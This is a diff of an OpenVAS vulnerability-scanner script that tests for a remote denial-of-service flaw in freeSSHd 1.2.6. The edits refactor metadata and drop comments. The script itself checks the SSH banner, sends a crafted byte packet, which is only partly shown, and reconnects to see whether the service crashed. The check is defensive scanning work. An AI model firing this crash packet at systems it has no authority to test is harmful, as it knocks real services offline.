@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_freesshd_remote_dos_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
+# $Id: secpod_freesshd_remote_dos_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
 #
 # FreeSSHd Remote Denial of Service Vulnerability
 #
@@ -24,37 +24,19 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation may allow remote attackers to cause the
-application to crash, creating a denial-of-service condition.
-
-Impact Level: Application";
-
-tag_affected = "freeSSHd version 1.2.6";
-
-tag_insight = "The flaw is due to an error when processing certain requests and
-can be exploited to cause a denial of service via a specially crafted packet.";
-
-tag_solution = "No solution or patch was made available for at least one year
-since disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.";
-
-tag_summary = "The host is running FreeSSHd and is prone to denial of service
-vulnerability.";
-
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902803");
-  script_version("$Revision: 9351 $");
+  script_version("$Revision: 11997 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-12-26 15:15:15 +0530 (Mon, 26 Dec 2011)");
   script_name("FreeSSHd Remote Denial of Service Vulnerability");
-  script_xref(name : "URL" , value : "http://www.1337day.com/exploits/17299");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18268");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108149/freesshdremote-dos.txt");
-  script_xref(name : "URL" , value : "http://www.allinfosec.com/2011/12/25/dos-poc-freesshd-remote-denial-of-service");
+  script_xref(name:"URL", value:"http://www.1337day.com/exploits/17299");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18268");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108149/freesshdremote-dos.txt");
+  script_xref(name:"URL", value:"http://www.allinfosec.com/2011/12/25/dos-poc-freesshd-remote-denial-of-service");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_DENIAL);
@@ -62,28 +44,30 @@ if(description)
   script_family("Denial of Service");
   script_dependencies("ssh_detect.nasl");
   script_require_ports("Services/ssh", 22);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
+application to crash, creating a denial-of-service condition.");
+  script_tag(name:"affected", value:"freeSSHd version 1.2.6");
+  script_tag(name:"insight", value:"The flaw is due to an error when processing certain requests and
+can be exploited to cause a denial of service via a specially crafted packet.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"The host is running FreeSSHd and is prone to denial of service
+vulnerability.");
   script_tag(name:"solution_type", value:"WillNotFix");
   exit(0);
 }
 
 
-## Get SSH Port
 port = get_kb_item("Services/ssh");
 if(!port){
   port = 22;
 }
 
-## Check Port State
 if(!get_port_state(port)){
   exit(0);
 }
 
-## Open TCP Socket
 soc = open_sock_tcp(port);
 if(!soc){
   exit(0);
@@ -92,12 +76,10 @@ if(!soc){
 ## Receive Banner
 banner = recv(socket:soc, length:1024);
 
-## Confirm the application before trying exploit
 if("WeOnlyDo" >!< banner){
   exit(0);
 }
 
-## Build Exploit
 req = raw_string(
 		0x53, 0x53, 0x48, 0x2d, 0x32, 0x2e, 0x30, 0x2d,
 		0x50, 0x75, 0x54, 0x54, 0x59, 0x5f, 0x4b, 0x69,
@@ -220,10 +202,8 @@ req = raw_string(
 ## Sending Exploit
 send(socket:soc, data:req);
 
-## Close socket
 close(soc);
 
-## Confirm FreeSSHd is alive and responding
 soc2 = open_sock_tcp(port);
 if(!soc2){
   security_message(port);
